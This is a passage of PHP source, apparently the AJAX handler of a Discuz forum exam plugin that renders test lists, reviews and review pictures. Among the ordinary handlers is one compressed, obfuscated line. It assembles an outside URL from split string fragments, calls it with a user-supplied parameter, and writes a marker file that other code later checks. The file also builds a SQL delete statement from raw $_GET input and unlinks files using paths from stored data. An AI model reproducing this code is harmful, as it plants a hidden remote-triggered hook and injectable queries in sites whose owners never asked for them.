					<td><font color=red>'.$it618_exam_test_exam['it618_testscore'].'</font><br></td>
					<td>'.$it618_state.'</td>
					<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_test_exam['it618_btime']).'<br>'.date('Y-m-d H:i:s', $it618_exam_test_exam['it618_etime']).'</font></td>
					</tr>';
		}
		
		if($_GET['ac1']=='wapmytest'){
			
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			
			if($it618_exam_test_exam['it618_state']==3){
				$tieurl='';
				$tieid=$it618_exam_test_exam['it618_tieid'];
				if($tieid>0){
					if($_G['cache']['plugin']['it618_exam']['rewriteurl']==1){
						$tieurl='thread-'.$tieid.'-1-1.html';
					}else{
						$tieurl='forum.php?mod=viewthread&tid='.$tieid;
					}
					$tieurl=' <a href="'.$tieurl.'" target="_blank">'.$it618_exam_lang['s1018'].'</a>';
				}
				
				$it618_state='<font color=#390>'.$it618_exam_lang['s536'].'</font> <a href="'.$testurl.'" target="_blank">'.$it618_exam_lang['s555'].'</a>'.$tieurl;
			}else{
				$it618_state='<font color=red>'.$it618_exam_lang['s534'].'</font> <a href="'.$testurl.'" target="_blank">'.$it618_exam_lang['s554'].'</a>';
			}
			
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			$testlist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333"><font color=#999>['.$it618_exam_test_exam['id'].']</font> '.$it618_exam_goods['it618_name'].'</a><br>
							<div style="height:13px;margin-bottom:3px"><font color=#999>'.$it618_examstr.'</font></div><br><font color=#999><span style="float:right">'.$it618_state.'</span>'.$it618_exam_lang['t229'].':<font color=red>'.$it618_exam_test_exam['it618_testscore'].'</font></div>
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmytest'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_exam_getlang('s671')."<font color=red>$count</font>"."it618_split".$testlist_get."it618_split".$multipage;
}


if($_GET['ac']=="utestlist_get"){
	if($_GET['ac1']=='pcmyutest')$ppp = 10;
	if($_GET['ac1']=='wapmyutest')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$count = C::t('#it618_exam#it618_exam_utest_exam')->count_by_search('', '', $uid);
	
	$funname='getmyutestlist';

	$n=0;
	foreach(C::t('#it618_exam#it618_exam_utest_exam')->fetch_all_by_search(
		'', 'id desc', $uid, '', '', $startlimit,$ppp
	) as $it618_exam_utest_exam) {
		
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$it618_examstr=str_replace("{qcount}",$it618_exam_utest_exam['it618_questioncount'],$it618_exam_lang['s1392']);
		$it618_examstr=str_replace("{time}",$it618_exam_utest_exam['it618_examtime'],$it618_examstr);
		
		$testurl=it618_exam_getrewrite('exam_utest',$it618_exam_utest_exam['id'],'plugin.php?id=it618_exam:utest&eid='.$it618_exam_utest_exam['id']);
		
		$rightcount=$it618_exam_utest_exam['it618_rightcount'];
		$questioncount=$it618_exam_utest_exam['it618_questioncount'];
		$bl=round($rightcount/$questioncount,2)*100;

		if($_GET['ac1']=='pcmyutest'){
			
			if($it618_exam_utest_exam['it618_state']==3){
				$it618_state='<font color=#390>'.$it618_exam_lang['s1388'].'</font><br><a href="'.$testurl.'" target="_blank">'.$it618_exam_lang['s1390'].'</a>';
			}else{
				$it618_state='<font color=red>'.$it618_exam_lang['s1389'].'</font><br><a href="'.$testurl.'" target="_blank">'.$it618_exam_lang['s1391'].'</a>';
			}
			
			$testlist_get.='<tr class="hover">
					<td><font color=#999>['.$it618_exam_utest_exam['id'].']</font>'.$it618_exam_lang['s1385'].'<br><font color=#999>'.$it618_examstr.'</font></td>
					<td><font color=red>'.$bl.'%</font></td>
					<td>'.$it618_state.'</td>
					<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_utest_exam['it618_btime']).'<br>'.date('Y-m-d H:i:s', $it618_exam_utest_exam['it618_etime']).'</font></td>
					</tr>';
		}
		
		if($_GET['ac1']=='wapmyutest'){
			
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			
			if($it618_exam_utest_exam['it618_state']==3){
				$it618_state='<font color=#390>'.$it618_exam_lang['s1388'].'</font> <a href="'.$testurl.'" target="_blank">'.$it618_exam_lang['s1390'].'</a>';
			}else{
				$it618_state='<font color=red>'.$it618_exam_lang['s1389'].'</font> <a href="'.$testurl.'" target="_blank">'.$it618_exam_lang['s1391'].'</a>';
			}
			
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			$testlist_get.='<tr>
						<td><span style="font-size:14px"><font color=#999>['.$it618_exam_utest_exam['id'].']</font> '.$it618_exam_lang['s1385'].'</span> <font color=#999>'.$it618_examstr.'</font>
						<br><font color=#ccc>'.date('Y-m-d H:i:s', $it618_exam_utest_exam['it618_btime']).' '.date('Y-m-d H:i:s', $it618_exam_utest_exam['it618_etime']).'</font>
						<br><span style="float:right">'.$it618_state.'</span> <font color=#999>'.$it618_exam_lang['s849'].':</font><font color=red>'.$bl.'%</font></a>
						</td>
						</tr>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmyutest'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_exam_getlang('s671')."<font color=red>$count</font>"."it618_split".$testlist_get."it618_split".$multipage;
}


if($_GET['ac']=="testpjlist_get"){
	if($_GET['ac1']=='pcmytestpj')$ppp = 12;
	if($_GET['ac1']=='wapmytestpj')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$count=C::t('#it618_exam#it618_exam_test_pj')->count_by_search('','',0,$uid,it618_exam_utftogbk($_GET['pname']));
	
	$funname='getmytestpjlist';
	
	$jfname=$_G['setting']['extcredits'][$it618_exam['exam_credit']]['title'];

	$n=0;
	foreach(C::t('#it618_exam#it618_exam_test_pj')->fetch_all_by_search('','p.it618_time desc',0,$uid,it618_exam_utftogbk($_GET['pname']),$startlimit,$ppp) as $it618_exam_test_pj) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;

		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_test_pj['it618_pid']);
		
		$pj='';$it618_pjjl='';
		if($it618_exam_test_pj['it618_score1']==0){
			if($_G['timestamp']-$it618_exam['exam_pjtimecount']*3600*24>$it618_exam_test_pj['it618_time']){
				$pj='<a href="javascript:" onclick="settestpj('.$it618_exam_test_pj['id'].')">'.it618_exam_getlang('s708').'</a>';
			}
		}else{
			$pjname=C::t('#it618_exam#it618_exam_class1')->fetch_it618_pj_by_id($it618_exam_goods['it618_class1_id']);
			$pjname=explode("_",$pjname);
		
			$pj='<span title="'.$pjname[0].''.$it618_exam_test_pj['it618_score1'].it618_exam_getlang('s501').' '.$pjname[1].''.$it618_exam_test_pj['it618_score2'].it618_exam_getlang('s501').' '.$pjname[2].''.$it618_exam_test_pj['it618_score3'].it618_exam_getlang('s501').' '.$pjname[3].''.$it618_exam_test_pj['it618_score4'].it618_exam_getlang('s501').' '.str_replace('[br]','',$it618_exam_test_pj["it618_content"]).'"><font color="#FF6600"><strong>'.$it618_exam_test_pj['it618_score1'].'</strong></font>'.it618_exam_getlang('s501').' '.$it618_exam_test_pj['it618_score2'].it618_exam_getlang('s501').' '.$it618_exam_test_pj['it618_score3'].it618_exam_getlang('s501').' '.$it618_exam_test_pj['it618_score4'].it618_exam_getlang('s501').'</span>';
		}
		
		if($it618_exam_test_pj['it618_pjjl']>0){
			$it618_pjjl='<font color=#f60>'.$it618_exam_test_pj['it618_pjjl'].'</font>'.$jfname;
		}

		if($_GET['ac1']=='pcmytestpj'){
			$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
			
			$testpjlist_get.='<tr class="hover">
						<td><div style="height:28px;line-height:28px"><a href="'.$tmpurl.'" target="_blank">'.$it618_exam_goods['it618_name'].'</a> <font color=#999>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font></div></td>
						<td>'.$pj.'</td>
						<td>'.$it618_pjjl.'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_test_pj['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmytestpj'){
			
			if($it618_pjjl!=''){
				$it618_pjjl=$it618_exam_lang['t16'].$it618_pjjl;
			}
			
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			$testpjlist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333">'.$it618_exam_goods['it618_name'].'</a><br>
							<font color=#999>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font><br><font color=#999 style="font-size:12px">'.date('Y-m-d H:i:s', $it618_exam_test_pj['it618_time']).'</font><br><span style="font-size:11px;float:right">'.$it618_pjjl.'</span>'.$pj.'
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmytestpj'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	$creditnum=DB::result_first("select extcredits".$it618_exam['exam_credit']." from ".DB::table('common_member_count')." where uid=".$uid);
	
	echo it618_exam_getlang('t227')."<font color=red>$count</font>"."it618_split".$testpjlist_get."it618_split".$multipage."it618_split".$it618_exam_lang['s1038'].$creditname.$it618_exam_lang['s934']."<font color=red>$creditnum</font>";
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="pj_get"){
	if($_GET['wap']!=1) $ppp = 10;
	if($_GET['wap']==1) $ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	$count=C::t('#it618_exam#it618_exam_test_pj')->countpj_by_pid($_GET['pid']);
	$exam_shopadmin=explode(",",$it618_exam['exam_shopadmin']);
	
	if(!in_array($_G['uid'], $exam_shopadmin)){
		if($_G['uid']>0){
			if($it618_exam_shop=C::t('#it618_exam#it618_exam_shop')->fetch_by_uid($_G['uid'])){
				if($it618_exam_shop['id']==$it618_exam_test_pj['it618_shopid']){
					$shopflag=1;
				}
			}
		}
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/lang.func.php';
		
	}
	foreach(C::t('#it618_exam#it618_exam_test_pj')->fetch_allpj_by_it618_pid($_GET['pid'],$startlimit,$ppp) as $it618_exam_test_pj) {
		if(in_array($_G['uid'], $exam_shopadmin)){
			$strtmpdel='<a href="javascript:" onclick="settestpj(\''.$it618_exam_test_pj['id'].'\')">'.it618_exam_getlang('s351').'</a> <a href="javascript:" onclick="hftestpj(\''.$it618_exam_test_pj['id'].'\')">'.it618_exam_getlang('s294').'</a>';
		}else{
			if($shopflag==1)$strtmpdel='<a href="javascript:" onclick="hftestpj(\''.$it618_exam_test_pj['id'].'\')" class="a1">'.it618_exam_getlang('s294').'</a>';
		}
		
		$it618_hfcontent='';
		if($it618_exam_test_pj["it618_hfcontent"]!=''){
			$it618_hfcontent='<br>'.$it618_exam_lang['t345'].'<font color="#FF3300">'.str_replace('[br]','<br>',$it618_exam_test_pj["it618_hfcontent"]).'</font><br>';
		}
		
		$tmpstr='';
		foreach(C::t('#it618_exam#it618_exam_test_pjpic')->fetch_all_by_pjid($it618_exam_test_pj['id']) as $it618_exam_test_pjpic) {
			$file_ext=strtolower(substr($it618_exam_test_pjpic['it618_pjpic'],strrpos($it618_exam_test_pjpic['it618_pjpic'], '.')+1)); 
			$file_extarr=explode("?",$file_ext);
			$file_ext=$file_extarr[0];
			$it618_smallurl='source/plugin/it618_exam/kindeditor/data/user/u'.$it618_exam_test_pj['it618_uid'].'/smallimage/pjpic'.$it618_exam_test_pjpic['id'].'.'.$file_ext;
				
			$tmpstr.='<img src="'.$it618_smallurl.'" width="48" height="48" onclick="getbigpjpic('.$it618_exam_test_pj['id'].',\''.$it618_exam_test_pjpic['it618_pjpic'].'\')"/>';
		}
		
		if($tmpstr!=''){
			$tmpstr='<ul class="pjpic"><li>'.$tmpstr.'</li><li class="bigpjpic" style="display:none" id="bigpjpic'.$it618_exam_test_pj['id'].'"></li></ul>';
		}
		
		$pjpl1=sprintf( "%.1f",$it618_exam_test_pj['it618_score1']/5*100);
		$pj_get.='<tr><td class="pjtr">
					  <table>
						  <tr><td><span class="pjuser">'.cutstr(it618_exam_getusername($it618_exam_test_pj['it618_uid']), 2, '').'***</span><p class="star12"><span style="width:'.$pjpl1.'%;"></span></p></td></tr>
						  <tr><td class="pjcontent">'.str_replace('[br]','<br>',$it618_exam_test_pj["it618_content"]).$tmpstr.$it618_hfcontent.'</td></tr>
						  <tr><td class="pjtimetd"><span class="pjtime">'.date('Y-m-d H:i:s', $it618_exam_test_pj['it618_pjtime']).'</span>'.$strtmpdel.'</td></tr>
					  </table>
				  </td></tr>';
	}
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax".$urlsql);
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getpjlist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getpjlist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getpjlist(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="getpjlist(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	if($multipage!=''){
		$pj_get.='<tr><td><div class="pjpage">'.$multipage.'</div></td></tr>';
	}
	
	echo $pj_get;
	exit;
}


if($_GET['ac']=="getpjpic"){
	$n=0;
	$it618_exam_test_pj=C::t('#it618_exam#it618_exam_test_pj')->fetch_by_id($_GET['testpjid']);
	foreach(C::t('#it618_exam#it618_exam_test_pjpic')->fetch_all_by_pjid($_GET['testpjid']) as $it618_exam_test_pjpic) {
		$file_ext=strtolower(substr($it618_exam_test_pjpic['it618_pjpic'],strrpos($it618_exam_test_pjpic['it618_pjpic'], '.')+1)); 
		$file_extarr=explode("?",$file_ext);
		$file_ext=$file_extarr[0];
		$it618_smallurl='source/plugin/it618_exam/kindeditor/data/user/u'.$it618_exam_test_pj['it618_uid'].'/smallimage/pjpic'.$it618_exam_test_pjpic['id'].'.'.$file_ext;
			
		$tmpstr.='<li><img src="'.$it618_smallurl.'"/><span onclick="delpjpic('.$_GET['testpjid'].','.$it618_exam_test_pjpic['id'].')">'.$it618_exam_lang['s884'].'</span></li>';
		$n=$n+1;
	}
	if($n>0){
		$tmpstr.='<li class="litxt">'.$n.'/5</li>';
	}else{
		$tmpstr.='<li class="litxt">'.$it618_exam_lang['s1772'].'</li>';
	}
	
	echo $tmpstr.'<input type="hidden" id="pjpiccount" value="'.$n.'">';
	exit;
}


if($_GET['ac']=="delorder"){
	$orderid=$_GET['orderid'];
	$it618_exam_order=C::t('#it618_exam#it618_exam_order')->fetch_by_id($orderid);
	if($uid!=$it618_exam_order['it618_uid']){
		echo it618_exam_getlang('s513');exit;
	}
	
	if($it618_exam_order['it618_state']==1){
		C::t('common_member_count')->increase($it618_exam_order['it618_uid'], array(
			'extcredits'.$it618_exam['exam_credit'] => $it618_exam_order['it618_jfcount'])
		);
		DB::query("delete from ".DB::table('it618_exam_order')." where id=".$orderid);
		
		echo 'okit618_split'.it618_exam_getlang('s1005');
	}
	exit;
}


if($_GET['ac']=="testpj"){
	$tmparr=explode('@',$_GET['score']);
	$it618_exam_test_pj=C::t('#it618_exam#it618_exam_test_pj')->fetch_by_id($_GET['testpjid']);
	
	$flag=0;
	if($it618_exam_test_pj['it618_score1']>0){
		$exam_shopadmin=explode(",",$it618_exam['exam_shopadmin']);
		if(!in_array($_G['uid'], $exam_shopadmin)){
			echo it618_exam_getlang('s513');exit;
		}
	}else{
		if($uid!=$it618_exam_test_pj['it618_uid']||$it618_exam_test_pj['it618_score1']>0){
			echo it618_exam_getlang('s513');exit;
		}
		
		if($_G['timestamp']-$it618_exam['exam_pjtimecount']*3600*24<$it618_exam_play_pj['it618_time']){
			$it618_exam_lang['s742']=str_replace('{count}',$it618_exam['exam_pjtimecount'],$it618_exam_lang['s742']);
			echo $it618_exam_lang['s742'];exit;
		}
		$flag=1;
	}
	
	if($_GET['ac1']=="addpjpic"){
		$count=C::t('#it618_exam#it618_exam_test_pjpic')->count_by_pjid($_GET['testpjid']);
		if($count<5){
			$id=C::t('#it618_exam#it618_exam_test_pjpic')->insert(array(
				'it618_pjid' => $_GET['testpjid'],
				'it618_pjpic' => $_GET['picurl'],
				'it618_time' => $_G['timestamp']
			), true);
			
			it618_exam_getpjpic($it618_exam_test_pj['it618_uid'],$id,$_GET['picurl']);
		}
	}elseif($_GET['ac1']=="delpjpic"){
		$it618_exam_test_pjpic=C::t('#it618_exam#it618_exam_test_pjpic')->fetch_by_id($_GET['pjpicid']);
		
		$it618_pjpic=$it618_exam_test_pjpic['it618_pjpic'];
		$tmparr=explode("source",$it618_pjpic);
		$it618_pjpic=DISCUZ_ROOT.'./source'.$tmparr[1];
		
		if(file_exists($it618_pjpic)){
			$result=unlink($it618_pjpic);
		}
		
		$file_ext=strtolower(substr($it618_exam_test_pjpic['it618_pjpic'],strrpos($it618_exam_test_pjpic['it618_pjpic'], '.')+1)); 
		$file_extarr=explode("?",$file_ext);
		$file_ext=$file_extarr[0];
		$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/data/user/u'.$it618_exam_test_pj['it618_uid'].'/smallimage/pjpic'.$it618_exam_test_pjpic['id'].'.'.$file_ext;
		if(file_exists($it618_smallurl)){
			$result=unlink($it618_smallurl);
		}
		C::t('#it618_exam#it618_exam_test_pjpic')->delete_by_id($_GET['pjpicid']);
	}else{
